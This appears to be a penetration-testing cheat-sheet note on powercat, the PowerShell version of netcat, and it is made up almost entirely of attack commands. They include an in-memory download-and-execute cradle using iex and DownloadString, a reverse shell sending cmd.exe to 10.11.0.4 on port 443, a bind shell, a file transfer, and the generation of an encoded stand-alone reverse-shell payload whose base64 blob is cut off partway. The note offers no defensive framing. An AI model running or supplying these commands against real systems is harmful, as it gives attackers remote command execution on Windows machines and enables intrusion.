---
Description: Is the PowerShell version of netcat. It can be downloaded using apt install powercat.
URL: https://github.com/besimorhino/powercat
---

>[!info]
>Is the PowerShell version of [netcat](netcat.md). It can be downloaded using `apt install powercat`.
>File will results within `/usr/share/windows-resources/powercat` directory.

Loading powercat within the current PowerShell session trough the Dot-Souring:

```powershell
PS C:\Users\Offsec> . .\powercat.ps1
```

Loading the script in memory from a remote machine:

```powershell
PS C:\Users\Offsec> iex (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')
```

---

## File transfer

Sending files as client:

```powershell
PS C:\Users\Offsec> powercat -c 10.11.0.4 -p 443 -i C:\Users\Offsec\powercat.ps1
```

---

## Shell

### Reverse Shell

```powershell
PS C:\Users\offsec> powercat -c 10.11.0.4 -p 443 -e cmd.exe
```

### Bind Shell

```powershell
PS C:\Users\offsec> powercat -l -p 443 -e cmd.exe
```

---

## Generate stand-alone payloads

```powershell
PS C:\Users\offsec> powercat -c 10.11.0.4 -p 443 -e cmd.exe -ge > encodedreverseshell.ps1
PS C:\Users\offsec> powershell.exe -E ZgB1AG4AYwB0AGkAbwBuACAAUwB0AHIAZQBhAG0AMQBfAFMAZQB0AHUAcAAKAHsACgAKACAAIAAgACAAcABhAH IAYQBtACgAJABGAHUAbgBjAFMAZQB0AHUAcABWAGEAcgBzACkACgAgACAAIAAgACQAYwAsACQAbAAsACQAcAAs ACQAdAAgAD0AIAAkAEYAdQBuAGMAUwBlAHQAdQBwAFYAYQByAHMACgAgACAAIAAgAGkAZgAoACQAZwBsAG8AYg BhAGwAOgBWAGUAcgBiAG8AcwBlACkAewAkAFYAZQByAGIAbwBzAGUAIAA9ACAAJABUAHIAdQBlAH0ACgAgACAA IAAgACQARgB1AG4AYwBWAGEAcgBzACAAPQAgAEAAewB9AAoAIAAgACAAIABpAGYAKAAhACQAbAApAAoAIAAgAC AAIAB7AAoAIAAgACAAIAAgACAAJABGAHUAbgBjAFYAYQByAHMAWwAiAGwAIgBdACAAPQAgACQARgBhAGwAcwBl AAoAIAAgACAAIAAgACAAJABTAG8AYwBrAGUAdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdA BlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAGMAcABDAGwAaQBlAG4AdAAKACAAIAAgACA
```